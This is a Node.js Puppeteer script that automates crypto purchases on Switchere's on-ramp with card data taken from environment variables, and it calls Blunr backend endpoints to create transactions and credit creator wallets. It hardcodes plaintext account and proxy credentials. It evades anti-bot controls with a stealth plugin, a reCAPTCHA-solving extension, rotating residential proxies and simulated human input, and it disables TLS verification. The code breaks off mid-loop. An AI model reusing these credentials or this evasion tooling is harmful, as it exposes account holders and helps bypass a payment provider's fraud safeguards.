const readline = require("readline");
const path = require("path");
const puppeteerExtra = require("puppeteer-extra");
const Stealth = require("puppeteer-extra-plugin-stealth");
const axios = require("axios");
const https = require("https");
puppeteerExtra.use(Stealth());
const fs = require("fs");
const { Subscript } = require("lucide-react");
const UserAgent = require("user-agents");

// Load Bright Data SSL certificate
const brightDataCert = fs.readFileSync(
  path.join(__dirname, "BrightData SSL certificate (port 33335).crt"),
);

// Create HTTPS agent with custom certificate
const httpsAgent = new https.Agent({
  ca: brightDataCert,
  rejectUnauthorized: false, // Set to true in production for better security
});

// Test Bright Data proxy connection
async function testBrightDataConnection() {
  try {
    console.log("Testing Bright Data proxy connection with SSL certificate...");

    const testResponse = await axios.get(
      "https://geo.brdtest.com/welcome.txt",
      {
        proxy: {
          protocol: "http",
          host: "brd.superproxy.io",
          port: 33335,
          auth: {
            username: "brd-customer-hl_db0d15f7-zone-web_unlocker1",
            password: "vj3959aai5pp",
          },
        },
        httpsAgent: httpsAgent,
        timeout: 10000,
      },
    );

    console.log("✅ Bright Data connection successful!");
    console.log("Response:", testResponse.data.substring(0, 100) + "...");
    return true;
  } catch (error) {
    console.log("❌ Bright Data connection failed:", error.message);
    return false;
  }
}

// After successful login, save cookies
async function saveCookies(page, filePath) {
  const cookies = await page.cookies();
  fs.writeFileSync(filePath, JSON.stringify(cookies, null, 2));
  console.log(`Cookies saved to ${filePath}`);
}

// Load cookies from file
async function loadCookies(page, filePath) {
  if (fs.existsSync(filePath)) {
    const cookies = JSON.parse(fs.readFileSync(filePath));
    await page.setCookie(...cookies);
    console.log(`Cookies loaded from ${filePath}`);
    return true;
  }
  return false;
}
// Use the correct Blunr API URL (not the checkout subdomain)
// Try the main API domain instead of checkout subdomain
// const blunrURL = "https://api.blunr.com/api/wallet/credit-user";
// Alternative URLs to try:
// const blunrURL = "https://blunr.com/api/wallet/credit-user";
const blunrURL = "https://backend.blunr.com/api/wallet/credit-user";
function askQuestion(query) {
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
  });

  return new Promise((resolve) =>
    rl.question(query, (ans) => {
      rl.close();
      resolve(ans);
    }),
  );
}

async function createExternalTransaction(blunrParams, amount) {
  try {
    if (!blunrParams.recipientId) {
      throw new Error("No recipient ID provided for transaction creation");
    }

    console.log("Creating external payment transaction...");

    const transactionURL =
      "https://backend.blunr.com/api/transaction/create-external";
    const requestData = {
      amount: parseFloat(amount),
      recipientId: blunrParams.recipientId,
      paymentProvider: "switchere",
      currency: "USD",
    };

    console.log(
      "Transaction request data:",
      JSON.stringify(requestData, null, 2),
    );

    const response = await axios.post(transactionURL, requestData, {
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
      timeout: 10000,
      httpsAgent: httpsAgent,
      proxy: false,
      maxRedirects: 0,
      validateStatus: function (status) {
        return true; // Accept any status code to see what's happening
      },
    });

    console.log("Transaction creation response status:", response.status);

    if (response.status === 201 && response.data.success) {
      console.log(
        "✅ Transaction created successfully:",
        response.data.transactionId,
      );
      return response.data.transactionId;
    } else {
      console.error("❌ Failed to create transaction:", response.data);
      throw new Error(
        `Transaction creation failed: ${response.data.message || "Unknown error"}`,
      );
    }
  } catch (error) {
    console.error("❌ Error creating external transaction:", error.message);
    if (error.response) {
      console.error("Response data:", error.response.data);
      console.error("Response status:", error.response.status);
    }
    throw error;
  }
}

async function addFundsToCreatorWallet(blunrParams, amount, transactionId) {
  try {
    if (!blunrParams.recipientId) {
      console.log("No recipient ID provided, skipping wallet update");
      return;
    }

    if (!transactionId) {
      console.log("No transaction ID provided, skipping wallet update");
      return;
    }

    console.log(
      `Adding ${amount} to creator wallet for recipient: ${blunrParams.recipientId}`,
    );
    console.log(`Making request to: ${blunrURL}`);

    // Log the full request details for debugging
    const requestData = {
      amount: parseFloat(amount),
      recipientId: blunrParams.recipientId,
      transactionId: transactionId,
      subscriptionId: blunrParams.subscriptionId
        ? blunrParams.subscriptionId
        : "",
      postId: blunrParams.postId ? blunrParams.postId : undefined,
      messageId: blunrParams.messageId ? blunrParams.messageId : undefined,
    };
    console.log("Request data:", JSON.stringify(requestData, null, 2));

    // First, let's check if we can reach the API
    console.log("Testing connection to Blunr API...");

    const response = await axios.post(blunrURL, requestData, {
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      },
      timeout: 10000,
      // Use the HTTPS agent with Bright Data certificate
      httpsAgent: httpsAgent,
      // Explicitly disable proxy for this request
      proxy: false,
      // Don't follow redirects automatically
      maxRedirects: 0,
      validateStatus: function (status) {
        return true; // Accept any status code to see what's happening
      },
    });

    if (response.status === 301 || response.status === 302) {
      console.log("Redirect detected. Location:", response.headers.location);
    }

    if (response.status === 404) {
      console.error("❌ Creator wallet API endpoint not found (404)");
      console.error("Please check if the API endpoint is correct:", blunrURL);

      // Check if we're getting a localhost response
      if (
        typeof response.data === "string" &&
        response.data.includes("localhost:3000")
      ) {
        console.error(
          "⚠️  WARNING: Request seems to be going to localhost instead of Blunr API!",
        );
        console.error(
          "This might be due to proxy configuration or DNS issues.",
        );
      }
    } else if (response.data.success || response.status === 200) {
      console.log("✅ Creator wallet updated successfully:", response.data);
    } else {
      console.error("❌ Failed to update creator wallet:", response.data);
      console.error("Status code:", response.status);
    }
  } catch (error) {
    console.error("❌ Error adding funds to creator wallet:", error.message);
    if (error.response) {
      console.error("Response data:", error.response.data);
      console.error("Response status:", error.response.status);
    }
  }
}

async function waitForPaybisIframe(page, retries = 20, delay = 3000) {
  for (let i = 0; i < retries; i++) {
    try {
      const iframeHandle = await page.waitForSelector(
        'iframe[src*="cp.paybis.com"]',
        { visible: true, timeout: 20000 },
      );
      if (iframeHandle) {
        console.log(`Paybis iframe found on attempt ${i + 1}`);
        return iframeHandle;
      }
    } catch (error) {
      console.log(`Paybis iframe not found. Retry ${i + 1}/${retries}...`);
      await new Promise((resolve) => setTimeout(resolve, delay));
    }
  }
  throw new Error("Paybis iframe did not appear after multiple retries.");
}

// Track CAPTCHA attempts to prevent infinite loops
let captchaAttempts = 0;
const MAX_CAPTCHA_ATTEMPTS = 5;

async function solveCaptchaIfNeeded(page) {
  try {
    // Check if page is still valid
    if (!page || page.isClosed()) {
      return;
    }

    // Prevent infinite CAPTCHA solving loops
    if (captchaAttempts >= MAX_CAPTCHA_ATTEMPTS) {
      console.log("Max CAPTCHA attempts reached, skipping further attempts");
      return;
    }

    // Check for multiple CAPTCHA selectors
    const captchaSelectors = [
      'iframe[title="recaptcha challenge expires in two minutes"]',
      'iframe[src*="recaptcha"]',
      ".g-recaptcha",
      "#recaptcha",
      'iframe[name="c-recaptcha"]',
    ];

    let captchaFrame = null;
    let foundCaptcha = false;

    for (const selector of captchaSelectors) {
      try {
        const iframe = await page.waitForSelector(selector, {
          visible: true,
          timeout: 1000,
        });
        if (iframe) {
          captchaFrame = await iframe.contentFrame();
          if (captchaFrame) {
            foundCaptcha = true;
            console.log(`CAPTCHA found with selector: ${selector}`);
            break;
          }
        }
      } catch (e) {
        // Try next selector
      }
    }

    if (!foundCaptcha) {
      return;
    }

    // Check if frame is still valid before using it
    try {
      await captchaFrame.evaluate(() => document.readyState);
    } catch (frameError) {
      return;
    }

    // Try multiple solver button selectors
    const solverSelectors = [
      "div.button-holder.help-button-holder",
      ".solver-button",
      "[id*=solver]",
      ".buster-button",
    ];

    let solverClicked = false;
    for (const selector of solverSelectors) {
      try {
        const helpButton = await captchaFrame.waitForSelector(selector, {
          timeout: 2000,
        });
        if (helpButton) {
          captchaAttempts++; // Increment attempt counter
          console.log(
            `CAPTCHA solver found with selector: ${selector}, attempting to solve... (attempt ${captchaAttempts}/${MAX_CAPTCHA_ATTEMPTS})`,
          );
          await helpButton.click();
          console.log("CAPTCHA solver clicked, waiting for resolution...");

          // Wait and check if CAPTCHA was actually solved
          let captchaSolved = false;
          for (let attempt = 0; attempt < 6; attempt++) {
            await new Promise((resolve) => setTimeout(resolve, 2000));

            // Check if CAPTCHA iframe still exists
            try {
              const stillExists = await page.$(
                'iframe[title="recaptcha challenge expires in two minutes"]',
              );
              if (!stillExists) {
                captchaSolved = true;
                console.log("CAPTCHA appears to be solved!");
                break;
              }
            } catch (e) {
              // CAPTCHA might be solved
              captchaSolved = true;
              break;
            }

            console.log(
              `CAPTCHA still present, waiting... (attempt ${attempt + 1}/6)`,
            );
          }

          if (!captchaSolved) {
            console.log("CAPTCHA solver may have failed, but continuing...");
          }

          solverClicked = true;
          break;
        }
      } catch (e) {
        // Try next selector
      }
    }

    if (!solverClicked) {
      console.log("CAPTCHA detected but no solver button found");
    }
  } catch (error) {
    // Silently handle common frame detachment errors
    if (
      error.message.includes("detached") ||
      error.message.includes("Target closed")
    ) {
      return;
    }
    // Don't log CAPTCHA check failures to reduce noise
  }
}

// Helper function to add random delays (more human-like)
function randomDelay(min = 500, max = 2000) {
  return new Promise((resolve) =>
    setTimeout(resolve, Math.floor(Math.random() * (max - min + 1)) + min),
  );
}

// Helper function to type text with human-like delays
async function typeWithDelay(page, selector, text, options = {}) {
  const element = await page.$(selector);
  if (!element) {
    throw new Error(`Element not found: ${selector}`);
  }

  // Clear existing content first
  await element.click({ clickCount: 3 });
  await page.keyboard.press("Backspace");

  // Random delay before typing
  await randomDelay(200, 500);

  // Type each character with random delay
  for (const char of text) {
    await page.type(selector, char, { delay: Math.random() * 100 + 50 });
    // Occasionally pause longer between words
    if (char === " " && Math.random() > 0.7) {
      await randomDelay(100, 300);
    }
  }
}

// Helper function to move mouse randomly (simulate human behavior)
async function randomMouseMovement(page) {
  const viewport = page.viewport();
  // Check if viewport exists
  if (!viewport) {
    console.log("⚠️ No viewport set, skipping mouse movement");
    return;
  }
  const x = Math.floor(Math.random() * viewport.width);
  const y = Math.floor(Math.random() * viewport.height);
  await page.mouse.move(x, y, { steps: Math.floor(Math.random() * 10) + 5 });
}

// Helper function for smart clicking with random offsets
async function humanClick(page, selector) {
  const element = await page.$(selector);
  if (!element) {
    throw new Error(`Element not found for clicking: ${selector}`);
  }

  const box = await element.boundingBox();
  if (!box) {
    throw new Error(`Element has no bounding box: ${selector}`);
  }

  // Click somewhere random within the element
  const x = box.x + box.width * 0.3 + Math.random() * box.width * 0.4;
  const y = box.y + box.height * 0.3 + Math.random() * box.height * 0.4;

  // Move mouse to element first
  await page.mouse.move(x, y, { steps: Math.floor(Math.random() * 10) + 5 });
  await randomDelay(100, 300);
  await page.mouse.click(x, y);
}

async function main() {
  const amount = process.env.AMOUNT || 200;
  const gmail = "m4teelias@gmail.com";
  const password = "Diana110604";
  const walletAddress = "bc1q23h9eysa08359yj2cy2chf4af7xvmc5c8qjk8y";
  const cardNumber = process.env.CARD_NUMBER;
  const expiryDate = process.env.EXPIRY_DATE;
  const cvv = process.env.CVV;
  const street = process.env.STREET;
  const city = process.env.CITY;
  const zip = process.env.ZIP;
  const name = process.env.NAME;

  // Parse Blunr parameters
  const blunrParams = JSON.parse(process.env.BLUNR_PARAMS || "{}");

  const extensionPath = path.join(process.cwd(), "buster-extension");

  // Generate random user agent
  const userAgent = new UserAgent({
    deviceCategory: "desktop",
    platform: "Win32", // Use Windows to be more common
  });
  const randomUserAgent = userAgent.toString();
  console.log(`🎭 Using User Agent: ${randomUserAgent}`);

  // Proxy configuration
  const proxyServer = "gate.nodemaven.com:8080";
  const proxyUsername =
    "blunrcomproxy-country-se-sid-1efde638a6944-filter-medium-speed-fast";
  const proxyPassword = "blunrcomproxy";
  const browser = await puppeteerExtra.launch({
    headless: "new",
    args: [
      `--disable-extensions-except=${extensionPath}`,
      `--load-extension=${extensionPath}`,
      "--no-sandbox",
      `--proxy-server=${proxyServer}`,
      `--proxy-bypass-list=<-loopback>`, // Bypass proxy for local requests
      "--ignore-certificate-errors-spki-list",
      "--ignore-certificate-errors",
      "--ignore-ssl-errors",
      `--user-agent=${randomUserAgent}`,
      `--ssl-client-certificate-file=${path.join(__dirname, "BrightData SSL certificate (port 33335).crt")}`,
    ],
  });
  /* const browser = await puppeteer.connect({
    browserWSEndpoint:
      "wss://mohammedistanbul123_gmail_com-country-any-sid-ee682069a1144:2xmllgs8ht@browser.nodemaven.com",
  }); */
  const page = await browser.newPage();

  // Override navigator properties to appear more human

  // Enable comprehensive network request/response logging
  console.log("🌐 === ENABLING NETWORK MONITORING ===");

  await page.authenticate({
    username: proxyUsername,
    password: proxyPassword,
  });

  await loadCookies(page, path.join(__dirname, "cookies.json"));

  console.log(`Using proxy: ${proxyServer} with username: ${proxyUsername}`);

  // Test proxy by checking IP

  let captchaInterval;
  let transactionId = null;

  try {
    // Create transaction record before starting payment
    console.log("Creating transaction record before payment...");
    transactionId = await createExternalTransaction(blunrParams, amount);
    console.log(`Transaction created with ID: ${transactionId}`);

    // Start CAPTCHA checking immediately and run throughout the entire process
    console.log("Starting CAPTCHA monitoring (checking every 3 seconds)...");
    captchaInterval = setInterval(() => solveCaptchaIfNeeded(page), 3000);

    console.log("🌐 === NAVIGATING TO SWITCHERE ===");
    console.log("📍 Target URL: https://switchere.com/onramp#/");

    // Try navigation with retry logic
    const navigationStart = Date.now();
    let navigationSuccess = false;
    let retries = 3;

    while (retries > 0 && !navigationSuccess) {
      try {
        await page.goto("https://switchere.com/onramp#/", {
          waitUntil: "domcontentloaded", // Less strict than networkidle2
          timeout: 90000, // 90 seconds timeout
        });
        navigationSuccess = true;
      } catch (navError) {
        console.log(`⚠️ Navigation attempt failed: ${navError.message}`);
        retries--;
        if (retries > 0) {
          console.log(`🔄 Retrying navigation... (${retries} attempts left)`);
          await randomDelay(2000, 5000);
        } else {
          throw navError;
        }
      }
    }

    // CAPTCHA checking already started at the beginning

    console.log(`Entering ${amount}...`);

    try {
      // Wait for page to fully load

      // Additional wait for dynamic content
      await new Promise((resolve) => setTimeout(resolve, 3000));

      // Take a debug screenshot
      await page.screenshot({
        path: path.join(__dirname, "screenshots", "debug-before-amount.png"),
        fullPage: true,
      });

      // Try multiple selectors
      const selectors = [
        ".sw-payment-amount-input",
        "input.sw-payment-amount-input",
        'input[placeholder="0.00"]',
        'input[type="text"][inputmode="decimal"]',
        ".sw-payment-input-group__amount-input",
      ];

      let amountInput = null;
      let foundSelector = null;

      for (const selector of selectors) {
        try {
          console.log(`Trying selector: ${selector}`);
          const element = await page.$(selector);
          if (element) {
            amountInput = element;
            foundSelector = selector;
            console.log(`Found input with selector: ${selector}`);
            break;
          }
        } catch (e) {
          console.log(`Selector ${selector} failed:`, e.message);
        }
      }

      // If still not found, try with evaluate
      if (!amountInput) {
        console.log("Trying with page.evaluate...");

        // First, let's see what inputs are on the page
        const inputInfo = await page.evaluate(() => {
          const inputs = Array.from(document.querySelectorAll("input"));
          return {
            count: inputs.length,
            inputs: inputs.map((input) => ({
              type: input.type,
              placeholder: input.placeholder,
              value: input.value,
              className: input.className,
              id: input.id,
              name: input.name,
            })),
          };
        });

        console.log(
          "Found inputs on page:",
          JSON.stringify(inputInfo, null, 2),
        );

        // Try to find the input
        const foundInput = await page.evaluate(() => {
          const inputs = Array.from(document.querySelectorAll("input"));
          const targetInput = inputs.find(
            (input) =>
              input.placeholder === "0.00" ||
              input.classList.contains("sw-payment-amount-input") ||
              input.value === "100" ||
              input.type === "text",
          );
          return targetInput ? true : false;
        });

        if (foundInput) {
          // Use page.evaluate to interact with it directly
          await page.evaluate((amountValue) => {
            const inputs = Array.from(document.querySelectorAll("input"));
            const targetInput = inputs.find(
              (input) =>
                input.placeholder === "0.00" ||
                input.classList.contains("sw-payment-amount-input") ||
                input.value === "100" ||
                input.type === "text",
            );

            if (targetInput) {
              targetInput.focus();
              targetInput.value = "";
              targetInput.value = amountValue;
              targetInput.dispatchEvent(new Event("input", { bubbles: true }));
              targetInput.dispatchEvent(new Event("change", { bubbles: true }));
            }
          }, amount.toString());

          console.log("Amount entered successfully using page.evaluate.");
        } else {
          // Check if we're on the right page
          const pageTitle = await page.title();
          const currentUrl = page.url();
          console.log("Page title:", pageTitle);
          console.log("Current URL:", currentUrl);

          // Log visible text on the page
          const visibleText = await page.evaluate(() => {
            return document.body.innerText.substring(0, 500);
          });
          console.log("Visible text on page:", visibleText);

          throw new Error(
            "Could not find amount input field - page might not have loaded correctly",
          );
        }
      } else if (amountInput) {
        // Original method if we found it with selectors
        const elementExists = await amountInput
          .evaluate((el) => el !== null)
          .catch(() => false);

        if (elementExists) {
          await amountInput.click({ clickCount: 3 });
          await new Promise((resolve) => setTimeout(resolve, 500));
          await page.keyboard.type(amount.toString(), { delay: 100 });
          console.log("Amount entered successfully.");
        } else {
          throw new Error("Found element handle but element is null");
        }
      }
    } catch (error) {
      console.error("Error entering amount:", error);
      throw error;
    }

    console.log("Waiting for 1 second...");
    await new Promise((resolve) => setTimeout(resolve, 1000));

    console.log("Clicking the first 'Buy' button...");
    const buyButtonHandle = await page.evaluateHandle(() => {
      const buttons = Array.from(document.querySelectorAll("button"));
      return buttons.find((button) => button.textContent.includes("Buy"));
    });
    if (buyButtonHandle.asElement()) {
      await buyButtonHandle.asElement().click();
      await new Promise((resolve) => setTimeout(resolve, 500));
      await buyButtonHandle.asElement().click();
      await buyButtonHandle.asElement().click();
    } else {
      throw new Error('Could not find "Buy" button');
    }
    console.log("First 'Buy' button clicked. Proceeding to login.");

    // Brief wait for page to respond after buy button click
    await new Promise((resolve) => setTimeout(resolve, 500));

    // Check if email input is visible (if not, we're already logged in)
    const emailSelectors = [
      "#email-input",
      'input[name="email"]',
      'input[type="email"]',
      '.sw-input__input[type="email"]',
    ];

    let emailInputVisible = false;
    for (const selector of emailSelectors) {
      try {
        await page.waitForSelector(selector, { visible: true, timeout: 500 });
        emailInputVisible = true;
        console.log(
          `Email input found with selector: ${selector} - proceeding with login`,
        );
        break;
      } catch (e) {
        // Email input not found with this selector
      }
    }

    if (!emailInputVisible) {
      console.log(
        "No email input visible - appears to be already logged in. Skipping login process.",
      );
    } else {
      console.log("Entering email...");

      let emailInput = null;
      for (const selector of emailSelectors) {
        try {
          console.log(`Trying email selector: ${selector}`);
          await page.waitForSelector(selector, {
            visible: true,
            timeout: 10000,
          });
          emailInput = await page.$(selector);
          if (emailInput) {
            console.log(`Found email input with selector: ${selector}`);
            break;
          }
        } catch (e) {
          console.log(`Email selector ${selector} failed:`, e.message);
        }
      }

      if (!emailInput) {
        await page.screenshot({
          path: path.join(__dirname, "screenshots", "email-input-debug.png"),
          fullPage: true,
        });
        throw new Error("Could not find email input field");
      }

      await emailInput.click();
      await new Promise((resolve) => setTimeout(resolve, 500));
      await emailInput.type(gmail);

      console.log("Waiting 1 second...");
      await new Promise((resolve) => setTimeout(resolve, 1000));
      console.log("Clicking 'Complete' after email...");

      // Take screenshot before clicking complete
      await page.screenshot({
        path: path.join(__dirname, "screenshots", "before-email-complete.png"),
        fullPage: true,
      });

      const completeButtonHandle = await page.evaluateHandle(() => {
        const buttons = Array.from(
          document.querySelectorAll('button[data-testid="submit"]'),
        );
        return buttons.find((button) =>
          button.textContent.includes("Complete"),
        );
      });
      if (completeButtonHandle.asElement()) {
        await completeButtonHandle.asElement().click();
        console.log("Email complete button clicked successfully");

        // Wait a bit after clicking
        await new Promise((resolve) => setTimeout(resolve, 2000));
      } else {
        // Log available buttons for debugging
        const availableButtons = await page.evaluate(() => {
          const buttons = Array.from(document.querySelectorAll("button"));
          return buttons.map((btn) => ({
            text: btn.textContent?.trim(),
            testId: btn.getAttribute("data-testid"),
            disabled: btn.disabled,
          }));
        });
        console.log(
          "Available buttons:",
          JSON.stringify(availableButtons, null, 2),
        );
        throw new Error('Could not find "Complete" button after email');
      }

      console.log("Entering password...");

      // Try multiple selectors and longer timeout
      const passwordSelectors = [
        "#password-input",
        'input[name="password"]',
        'input[type="password"]',
        '.sw-input__input[type="password"]',
      ];

      let passwordInput = null;
      let foundPasswordSelector = null;

      for (const selector of passwordSelectors) {
        try {
          console.log(`Trying password selector: ${selector}`);
          await page.waitForSelector(selector, {
            visible: true,
            timeout: 10000,
          });
          passwordInput = await page.$(selector);
          if (passwordInput) {
            foundPasswordSelector = selector;
            console.log(`Found password input with selector: ${selector}`);
            break;
          }
        } catch (e) {
          console.log(`Password selector ${selector} failed:`, e.message);
        }
      }

      if (!passwordInput) {
        // Take debug screenshot
        await page.screenshot({
          path: path.join(__dirname, "screenshots", "password-input-debug.png"),
          fullPage: true,
        });

        // Log all password-type inputs on the page
        const passwordInputs = await page.evaluate(() => {
          const inputs = Array.from(
            document.querySelectorAll(
              'input[type="password"], input[name="password"]',
            ),
          );
          return inputs.map((input) => ({
            id: input.id,
            name: input.name,
            className: input.className,
            placeholder: input.placeholder,
            visible: input.offsetParent !== null,
          }));
        });
        console.log(
          "Available password inputs:",
          JSON.stringify(passwordInputs, null, 2),
        );

        throw new Error("Could not find password input field");
      }

      await passwordInput.click();
      await new Promise((resolve) => setTimeout(resolve, 500));
      await passwordInput.type(password);

      console.log("Clicking 'Complete' after password to log in...");

      // Take screenshot before login
      await page.screenshot({
        path: path.join(__dirname, "screenshots", "before-login.png"),
        fullPage: true,
      });

      const loginButtonHandle = await page.evaluateHandle(() => {
        const buttons = Array.from(
          document.querySelectorAll('button[data-testid="submit"]'),
        );
        return buttons.find((button) =>
          button.textContent.includes("Complete"),
        );
      });
      if (loginButtonHandle.asElement()) {
        await loginButtonHandle.asElement().click();
        console.log("Login button clicked successfully");

        // Wait for login to process
        await new Promise((resolve) => setTimeout(resolve, 3000));
      } else {
        // Log available buttons for debugging
        const availableButtons = await page.evaluate(() => {
          const buttons = Array.from(document.querySelectorAll("button"));
          return buttons.map((btn) => ({
            text: btn.textContent?.trim(),
            testId: btn.getAttribute("data-testid"),
            disabled: btn.disabled,
          }));
        });
        console.log(
          "Available login buttons:",
          JSON.stringify(availableButtons, null, 2),
        );
        throw new Error('Could not find "Complete" login button');
      }

      console.log("Login successful.");

      console.log("Taking screenshot '2.png' of the main page after login.");
      await page.screenshot({
        path: path.join(__dirname, "screenshots", "2.png"),
      });
      console.log("Screenshot taken.");

      // Save cookies after successful login to refresh them
      await saveCookies(page, path.join(__dirname, "cookies.json"));
      console.log("Cookies saved after login.");
    }

    console.log("Entering wallet address...");

    // Wait for page to be ready and wallet input to appear
    try {
      await page.waitForSelector('input[name="wallet"]', {
        visible: true,
        timeout: 45000, // 45 seconds timeout
      });

      // Add random mouse movement before interacting

      await randomDelay(500, 1500);

      // Use human-like typing for wallet address
      await typeWithDelay(page, 'input[name="wallet"]', walletAddress);
      console.log("Wallet address entered.");

      // Random delay after typing
      await randomDelay(500, 1000);
    } catch (walletError) {
      console.error("❌ Failed to find wallet input field");
      console.error("Error:", walletError.message);

      // Take screenshot for debugging
      await page.screenshot({
        path: path.join(__dirname, "screenshots", "wallet-error.png"),
        fullPage: true,
      });

      // Check if we're on the right page
      const currentUrl = page.url();
      console.log("Current URL:", currentUrl);

      throw walletError;
    }

    console.log("Waiting for 1 second...");
    await new Promise((resolve) => setTimeout(resolve, 1000));
    console.log("Clicking the second 'Buy' button...");
    const buyButtons2Handle = await page.evaluateHandle(() => {
      const buttons = Array.from(document.querySelectorAll("button"));
      const buyButtons = buttons.filter((button) =>
        button.textContent.includes("Buy"),
      );
      return buyButtons.length > 0 ? buyButtons[buyButtons.length - 1] : null;
    });
    if (buyButtons2Handle.asElement()) {
      await buyButtons2Handle.asElement().click();
    } else {
      throw new Error('Could not find second "Buy" button');
    }
    console.log("Second 'Buy' button clicked. Proceeding to purchase.");

    // (Previous code remains the same)

    console.log(
      "Waiting for the page to settle before looking for 'New card' button...",
    );
    await new Promise((resolve) => setTimeout(resolve, 5000)); // Shortened wait

    await page.screenshot({
      path: path.join(__dirname, "screenshots", "before-new-card.png"),
    });

    console.log("Looking for 'New card' button or CAPTCHA...");
    let newCardClicked = false;
    for (let i = 0; i < 20; i++) {
      // Increased retries to 20 (total 1 minute)
      try {
        // Take a debug screenshot every 5 attempts
        if (i % 5 === 0) {
          await page.screenshot({
            path: path.join(
              __dirname,
              "screenshots",
              `new-card-search-${i}.png`,
            ),
            fullPage: true,
          });
          console.log(`📸 Debug screenshot taken: new-card-search-${i}.png`);
        }

        // Log comprehensive page content
        const pageContent = await page.evaluate(() => {
          return {
            url: window.location.href,
            title: document.title,
            bodyText: document.body.innerText.substring(0, 800),
            buttons: Array.from(document.querySelectorAll("button")).map(
              (btn) => ({
                text: btn.textContent?.trim(),
                className: btn.className,
                id: btn.id,
                visible: btn.offsetParent !== null,
                style: btn.style.cssText || "none",
                dataset:
                  Object.keys(btn.dataset).length > 0 ? btn.dataset : null,
              }),
            ),
            links: Array.from(document.querySelectorAll("a")).map((link) => ({
              text: link.textContent?.trim(),
              href: link.href,
              className: link.className,
              id: link.id,
              visible: link.offsetParent !== null,
            })),
            divs: Array.from(document.querySelectorAll("div"))
              .filter((div) => {
                const text = div.textContent?.toLowerCase() || "";
                const classes = div.className?.toLowerCase() || "";
                return (
                  text.includes("card") ||
                  text.includes("new") ||
                  classes.includes("card") ||
                  classes.includes("new") ||
                  text.includes("payment") ||
                  text.includes("checkout")
                );
              })
              .map((div) => ({
                text: div.textContent?.trim().substring(0, 100),
                className: div.className,
                id: div.id,
                visible: div.offsetParent !== null,
                clickable:
                  div.onclick !== null || div.style.cursor === "pointer",
              })),
            spans: Array.from(document.querySelectorAll("span"))
              .filter((span) => {
                const text = span.textContent?.toLowerCase() || "";
                const classes = span.className?.toLowerCase() || "";
                return (
                  text.includes("new card") ||
                  text.includes("add card") ||
                  classes.includes("card") ||
                  classes.includes("new")
                );
              })
              .map((span) => ({
                text: span.textContent?.trim(),
                className: span.className,
                id: span.id,
                visible: span.offsetParent !== null,
                clickable:
                  span.onclick !== null || span.style.cursor === "pointer",
              })),
          };
        });
        if (i % 5 === 0) {
          // Only log detailed content every 5 attempts to reduce spam
          console.log(
            `🔍 Detailed page state at attempt ${i + 1}:`,
            JSON.stringify(pageContent, null, 2),
          );
        } else {
          console.log(
            `🔍 Quick check at attempt ${i + 1}: ${pageContent.buttons.length} buttons, ${pageContent.links.length} links, ${pageContent.divs.length} card-related divs`,
          );
        }

        // Try multiple selectors for the new card button with broader matching
        const newCardSelectors = [
          ".card-select__new-card .new-card",
          ".new-card",
          "button.new-card",
          ".card-select__new-card",
          '[class*="new-card"]',
          '[class*="new_card"]',
          'button[class*="card"]',
          'a[class*="card"]',
          'div[class*="card"][class*="new"]',
          'div[class*="new"][class*="card"]',
          '[data-testid*="new-card"]',
          '[data-testid*="card"]',
          'button[data-action*="card"]',
          'button[data-type*="card"]',
          '[role="button"][class*="card"]',
          'span[class*="card"][class*="new"]',
        ];

        // Text-based selectors (handled separately due to complexity)
        const textBasedSelectors = [
          { tag: "button", text: "New card" },
          { tag: "a", text: "New card" },
          { tag: "div", text: "New card" },
          { tag: "span", text: "New card" },
          { tag: "button", text: "Add card" },
          { tag: "a", text: "Add card" },
          { tag: "div", text: "Add card" },
          { tag: "button", text: "Add new card" },
          { tag: "a", text: "Add new card" },
          { tag: "*", text: "New payment method" },
          { tag: "*", text: "Add payment method" },
        ];

        // First, check for the 'New card' button inside all frames
        for (const frame of page.frames()) {
          try {
            const frameUrl = frame.url();
            console.log(`🔍 Checking frame: ${frameUrl}`);

            for (const selector of newCardSelectors) {
              try {
                // Use evaluateHandle for more complex selectors
                const elementHandle = await frame.evaluateHandle((sel) => {
                  // For :contains selector
                  if (sel.includes(":contains")) {
                    const searchText = sel.match(/:contains\("([^"]+)"\)/)?.[1];
                    const tagName = sel.split(":")[0];
                    if (searchText) {
                      const elements = Array.from(
                        document.querySelectorAll(tagName),
                      );
                      return elements.find((el) =>
                        el.textContent?.includes(searchText),
                      );
                    }
                  }
                  // For regular selectors
                  return document.querySelector(sel);
                }, selector);

                const element = elementHandle.asElement();
                if (element) {
                  const isVisible = await element.evaluate(
                    (el) => el.offsetParent !== null,
                  );
                  if (isVisible) {
                    console.log(
                      `✅ Found 'New card' element with selector: ${selector}`,
                    );
                    await element.click();
                    newCardClicked = true;
                    break;
                  }
                }
              } catch (e) {
                // Continue to next selector
              }
            }

            if (newCardClicked) break;
          } catch (frameError) {
            console.log(`⚠️ Error checking frame: ${frameError.message}`);
          }
        }

        if (newCardClicked) break;

        // Also try searching in the main page (not just frames)
        console.log("🔍 Searching in main page...");
        
        // Check CSS selectors on main page
        for (const selector of newCardSelectors) {
          try {
            const element = await page.$(selector);
            if (element) {
              const isVisible = await element.evaluate(
                (el) => el.offsetParent !== null,
              );
              if (isVisible) {
                console.log(
                  `✅ Found 'New card' element in main page with CSS selector: ${selector}`,
                );
                await element.click();
                newCardClicked = true;
                break;
              }
            }
          } catch (e) {
            // Continue to next selector
          }
        }

        if (newCardClicked) break;

        // Check text-based selectors on main page
        for (const { tag, text } of textBasedSelectors) {
          try {
            const element = await page.evaluateHandle(
              (tagName, searchText) => {
                const elements = Array.from(
                  document.querySelectorAll(
                    tagName === "*" ? "button, a, div, span" : tagName,
                  ),
                );
                return elements.find((el) => {
                  const elementText = el.textContent?.trim().toLowerCase() || "";
                  const searchLower = searchText.toLowerCase();
                  return (
                    elementText.includes(searchLower) ||
                    elementText === searchLower ||
                    el
                      .getAttribute("aria-label")
                      ?.toLowerCase()
                      .includes(searchLower) ||
                    el
                      .getAttribute("title")
                      ?.toLowerCase()
                      .includes(searchLower)
                  );
                });
              },
              tag,
              text,
            );

            const el = element.asElement();
            if (el) {
              const isVisible = await el.evaluate(
                (el) => el.offsetParent !== null,
              );
              if (isVisible) {
                console.log(
                  `✅ Found 'New card' element in main page with text "${text}" in ${tag} tag`,
                );
                await el.click();
                newCardClicked = true;
                break;
              }
            }
